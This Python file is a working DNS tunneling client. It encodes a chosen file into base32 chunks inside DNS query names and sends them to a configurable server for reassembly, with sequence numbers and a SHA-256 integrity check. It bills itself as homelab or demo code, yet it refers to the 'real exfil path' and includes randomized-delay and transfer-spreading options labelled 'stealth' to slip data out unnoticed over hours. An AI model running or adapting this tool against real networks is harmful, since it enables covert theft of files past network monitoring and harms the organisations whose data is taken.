#!/usr/bin/env python3
"""DNS tunneling client: sends a file as base32 chunks in DNS query names.

Authorized homelab / awareness-demo use only, against a server you own.
"""
import argparse
import base64
import hashlib
import os
import random
import re
import socket
import struct
import time

CHUNK = 35  # bytes per chunk -> 56 base32 chars, fits a 63-byte DNS label


def b32encode(b):
    return base64.b32encode(b).decode().rstrip("=")


def build_query(qid, name, qtype=1):
    header = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    qname = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    return header + qname + struct.pack("!HH", qtype, 1)


def parse_response(data, qid):
    if len(data) < 12:
        return None
    rid, flags, qd, an, _ns, _ar = struct.unpack("!HHHHHH", data[:12])
    if rid != qid:
        return None
    rcode = flags & 0x0F
    pos = 12
    for _ in range(qd):
        while data[pos] != 0:
            pos += 1 + data[pos]
        pos += 5
    txt = b""
    for _ in range(an):
        if (data[pos] & 0xC0) == 0xC0:
            pos += 2
        else:
            while data[pos] != 0:
                pos += 1 + data[pos]
            pos += 1
        rtype, _rclass, _ttl, rdlen = struct.unpack("!HHIH", data[pos:pos + 10])
        pos += 10
        rdata = data[pos:pos + rdlen]
        pos += rdlen
        if rtype == 16 and rdata:
            txt = rdata[1:1 + rdata[0]]
    return rcode, txt


def query(sock, server, name, retries=3, timeout=1.0):
    for _ in range(retries):
        qid = random.randrange(65536)
        sock.sendto(build_query(qid, name), server)
        sock.settimeout(timeout)
        try:
            data, _ = sock.recvfrom(4096)
            res = parse_response(data, qid)
            if res:
                return res
        except socket.timeout:
            pass
    raise RuntimeError(f"no response from server for {name}")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--server", default="127.0.0.1", help="authoritative server (or your lab resolver to simulate the real exfil path)")
    ap.add_argument("--port", type=int, default=5353)
    ap.add_argument("--zone", default="tunnel.local")
    ap.add_argument("--file", required=True)
    ap.add_argument("--name", default=None, help="output filename on the server (default: basename of --file)")
    ap.add_argument("--delay-min", type=float, default=None, help="min seconds to sleep between queries (stealth)")
    ap.add_argument("--delay-max", type=float, default=None, help="max seconds to sleep between queries (stealth)")
    ap.add_argument("--spread-over", type=float, default=None, metavar="SECONDS",
                    help="spread the whole transfer over this many seconds; delay range is randomized around the average")
    args = ap.parse_args()

    with open(args.file, "rb") as f:
        blob = f.read()
    digest = hashlib.sha256(blob).hexdigest()
    chunks = [blob[i:i + CHUNK] for i in range(0, len(blob), CHUNK)]
    total = len(chunks)
    sess = os.urandom(4).hex()

    if args.spread_over is not None and total > 0:
        avg = args.spread_over / total
        dmin = args.delay_min if args.delay_min is not None else max(0.05, avg * 0.5)
        dmax = args.delay_max if args.delay_max is not None else avg * 1.5
    elif args.delay_min is not None or args.delay_max is not None:
        dmin = args.delay_min or 0.0
        dmax = args.delay_max if args.delay_max is not None else dmin
    else:
        dmin = dmax = 0.0

    name = args.name or os.path.basename(args.file)
    name = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:30]
    fn_b32 = b32encode(name.encode())

    server = (args.server, args.port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    suffix = f"up.{args.zone}".split(".")

    def q(labels):
        rcode, txt = query(sock, server, ".".join(labels + suffix))
        if rcode != 0:
            raise RuntimeError(f"server error rcode={rcode} for {labels[0]}")
        return txt

    print(f"[client] session {sess}: {len(blob)} bytes in {total} chunk(s) -> {'/'.join(suffix)}")
    if dmax > 0:
        est = total * (dmin + dmax) / 2
        print(f"[client] randomized delay {dmin:.2f}-{dmax:.2f}s per query, estimated transfer ~{est / 3600:.2f}h")
    print(f"[client] start ack: {q(['s', fn_b32, f'{total:04x}', sess]).decode()}")
    for i, c in enumerate(chunks):
        if dmax > 0:
            time.sleep(random.uniform(dmin, dmax))
        txt = q(["c", b32encode(c), f"{i:04x}", sess])
        if i % 10 == 0 or i == total - 1:
            print(f"[client] chunk {i + 1}/{total} ack={txt.decode()}")
    print(f"[client] end ack: {q(['e', digest[:32], digest[32:], sess]).decode()}")


if __name__ == "__main__":
    main()
